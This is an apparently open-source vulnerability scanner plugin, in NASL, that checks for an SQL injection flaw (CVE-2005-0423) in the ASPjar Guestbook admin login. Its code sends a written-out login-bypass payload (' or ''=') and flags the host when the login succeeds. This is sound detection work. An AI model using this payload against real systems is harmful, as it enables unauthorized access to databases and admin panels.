# SPDX-FileCopyrightText: 2005 Noam Rathaus
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.16389");
  script_version("2024-06-13T05:05:46+0000");
  script_tag(name:"last_modification", value:"2024-06-13 05:05:46 +0000 (Thu, 13 Jun 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2005-0423");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/12521");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/12823");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("ASPjar Guestbook SQLi Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl",
                      "gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Delete this application.");

  script_tag(name:"summary", value:"ASPJar's GuestBook is prone to an SQL injection (SQLi) vulnerability).");

  script_tag(name:"insight", value:"The remote version of this software is vulnerable to a SQL
  injection vulnerability which allows a remote attacker to execute arbitrary SQL statements against
  the remote DB. It is also vulnerable to an input validation vulnerability which may allow an
  attacker to perform a cross site scripting attack using the remote host.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_asp( port:port ) )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/admin/login.asp?Mode=login";
  req = string( "POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Accept: text/html\r\n",
                "Accept-Encoding: none\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: 56\r\n\r\n",
                "User=&Password=%27+or+%27%27%3D%27&Submit=++++Log+In++++");
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( "You are Logged in!" >< res && "Login Page" >< res ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
